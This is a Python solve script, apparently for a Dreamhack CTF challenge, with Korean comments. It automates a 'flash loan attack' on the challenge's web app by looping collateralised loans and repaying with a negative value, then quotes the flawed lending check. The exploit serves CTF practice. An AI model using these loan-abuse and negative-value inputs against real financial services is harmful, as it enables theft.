import requests

'''
플래그 획득 절차
0. 로그인 후 세션 쿠키 획득
1. DHH 빌리기
2. DHH 전액 DHC로 환전
3. 환전한 DHC를 드림 유동성 풀에서 담보 전환
4. 전환한 담보의 80% 만큼을 DHD로 대출 계속 반복
5. 대출 완료 후 DHD 전액 DHH로 환전
6. 환전한 DHH를 빌린만큼 -를 넣고 대출 상환
7. 상환 후 FLAG 구매

-> 키워드 : FLASH LOAN ATTACK
'''

URL = "http://host1.dreamhack.games:23937"
SANTA_LEND_URI = "/santa/lend"
SANTA_CHANGE_URI = "/santa/change"
DREAM_COLLATERAL_URI = "/dream/collateral"
DREAM_LEND_URI = "/dream/lend"
FLAG_URI = "/santa/flag"
SIGN_IN = {'name': 'SwollowS'}
SANTA_LEND_PAYLOAD = {'value': '1000'}
EXCHANGE_DHH_DHC_PAYLOAD = {'value':'1000', 'from': '0', 'to': '1'}
DREAM_COLLATERAL_PAYLOAD = SANTA_LEND_PAYLOAD
DREAM_LEND_PAYLOAD = {'value': '800'}
EXCHANGE_DHD_DHH_PAYLOAD = {'value':'3200', 'from':'2', 'to':'0'}
SANTA_REPAY_PAYLOAD = {'value':'-1000'}

session = requests.Session()

# 1. CREATE SESSION
session.post(URL, data=SIGN_IN)

# 2. LEND DHH COIN 1000
session.post(URL + SANTA_LEND_URI, data=SANTA_LEND_PAYLOAD)

# 3. EXCHANGE ALL DHH TO DHC
session.post(URL + SANTA_CHANGE_URI, data=EXCHANGE_DHH_DHC_PAYLOAD)

# 4. COLLATERAL ALL DHC
session.post(URL + DREAM_COLLATERAL_URI, data=DREAM_COLLATERAL_PAYLOAD)

# 5. EXECUTE DHD LOANS EQUIVALENT TO 80% OF TOTAL COLLATERAL 4 TIMES
for i in range(4):
    session.post(URL + DREAM_LEND_URI, data=DREAM_LEND_PAYLOAD)

# 6. EXCHANGE ALL DHD TO DHH
session.post(URL + SANTA_CHANGE_URI, data=EXCHANGE_DHD_DHH_PAYLOAD)

# 7. REPAY THE FULL DHH LOAN
session.post(URL + SANTA_LEND_URI, data=SANTA_REPAY_PAYLOAD)

# 8. GET FLAG
resp = session.get(URL + FLAG_URI)

print(resp.text)


'''
    max_lend = session['col_DHC'] * dhc_price / dhd_price * 0.8

    print(max_lend)

    if session['DHD'] + value < 0.0:
        return render_template("dream.html", session=session, message="더 갚으시게요...?")
    if max_lend < value:
        return render_template("dream.html", session=session, message="그만큼 빌리기에는 담보가 부족합니다!")
    -> 취약점 발생 지점 : 담보 대출 시 현재 자산 규모 대비 대출 제한하는 로직이 존재하지 않음
'''